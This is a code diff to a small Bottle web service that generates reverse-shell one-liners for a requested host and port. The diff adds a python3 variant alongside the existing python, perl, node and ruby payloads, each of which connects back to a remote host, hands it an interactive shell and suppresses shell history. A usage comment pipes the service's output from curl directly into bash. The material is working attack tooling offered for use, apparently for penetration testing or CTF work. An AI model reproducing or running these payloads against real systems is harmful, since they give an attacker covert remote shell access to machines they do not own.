@@ -9,6 +9,7 @@ app = application = Bottle()
 
 
 SHELLS = [['python', """printf 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));s.sendall("%(msg)s");os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/%(sh)s");s.close()' | python"""],
+          ['python3', """printf 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%(host)s",%(port)s));s.sendall(bytes("%(msg)s","UTF-8"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/%(sh)s");s.close()' | python3"""],
           ['perl', """printf 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(%(port)s,inet_aton("%(host)s")))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");print("%(msg)s");exec("/bin/%(sh)s -i");};' | perl"""],
           ['node', """printf 'var net=require("net"),sh=require("child_process").exec("/bin/%(sh)s -i");var client=new net.Socket();client.connect(%(port)s, "%(host)s", function(){client.write("%(msg)s");client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});' | node"""],
           ['ruby', """printf 'require "socket";s=Socket.new 2,1;s.connect Socket.sockaddr_in %(port)s, "%(host)s";s.write("%(msg)s");[0,1,2].each { |fd| syscall 33, s.fileno, fd };exec "/bin/%(sh)s -i"' | ruby"""],
@@ -34,6 +35,7 @@ def files(filename):
 
 @app.get('/<host>/<port>') # Usage: curl localhost:8081/10.10.10.21/4444 | bash
 def genshell(host, port):
+    response.set_header('Content-Type', 'text/plain')
     try:
         sh = 'bash'
         if '+' in host:
